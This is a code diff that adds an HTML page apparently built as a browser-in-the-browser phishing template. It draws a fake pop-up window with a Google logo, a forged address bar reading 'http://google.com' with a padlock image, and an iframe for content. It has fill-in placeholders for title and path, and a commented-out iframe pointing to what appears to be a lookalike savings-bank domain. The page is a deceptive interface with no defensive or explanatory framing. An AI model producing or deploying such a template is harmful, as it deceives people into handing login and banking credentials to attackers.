@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html>
+<style>
+	/* .center {
+    margin: auto;
+    width: 60%;
+    padding: 20px;
+    box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);
+} */
+	.hideform {
+		display: none;
+	}
+</style>
+
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="stylesheet" href="style.css">
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+
+</head>
+
+<!-- <iframe id="content" src="www.google1.com" frameBorder="0"></iframe> -->
+
+<body>
+	<!-- <img src="icon.png " width="200" height="200"> -->
+
+	<div id="window" class="center hideform">
+		<!-- Title bar start -->
+		<div id="title-bar-width">
+			<div id="title-bar">
+				<div style="margin-top:5px;">
+					<img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" width="20px"
+						height="15px" id="logo">
+					<span id="logo-description">XX-TITLE-XX</span>
+				</div>
+
+				<div>
+					<span id="minimize">&#8212;</span>
+					<span id="square">□</span>
+					<span id="exit">✕</span>
+				</div>
+			</div>
+			<div id="url-bar">
+				<img src="https://wasabipublicity.com/wp-content/uploads/sites/6/2016/12/SSL.jpg" width="20px"
+					height="20px" id="ssl-padlock">
+				<!-- <p>XX-DOMAIN-NAME-XX</p> -->
+				<span id="domain-name">http://google.com</span>
+				<span id="domain-path">XX-DOMAIN-PATH-XX</span>
+			</div>
+		</div>
+		<!-- Content start -->
+		<iframe id="content" src="www.google.com" frameBorder="0"></iframe>
+		<!-- <iframe id="content" src="https://hilfe-sparkasse.de/de/6415cf8" frameBorder="0"></iframe> -->
+
+	</div>
+	<button type="submit" id="show" onclick="openForm()">Show form</button>
+	<script>
+		$('#show').on('click', function () {
+			$('.center').show();
+
+		})
+
+		$('#exit').on('click', function () {
+			$('.center').hide();
+			$('#show').show();
+		})
+		function openForm() {
+			document.getElementById("window").style.display = "block";
+			event.preventDefault();
+		}
+	</script>
+</body>
+<script src="script.js"></script>
+
+</html>
